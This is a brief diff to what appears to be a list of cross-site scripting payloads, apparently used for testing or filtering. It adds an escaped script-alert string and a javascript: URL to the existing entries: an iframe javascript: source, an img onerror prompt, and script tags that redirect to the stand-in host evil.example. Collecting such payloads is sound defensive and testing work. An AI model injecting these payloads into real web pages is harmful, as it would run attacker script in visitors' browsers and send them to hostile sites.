@@ -4,3 +4,5 @@
 <iframe src="javascript:alert(1)">
 <img src=x onerror=prompt(1)>
 <script>document.location='http://evil.example'</script>
+&lt;script&gt;alert(1)&lt;/script&gt;
+javascript:document.location='http://evil.example'
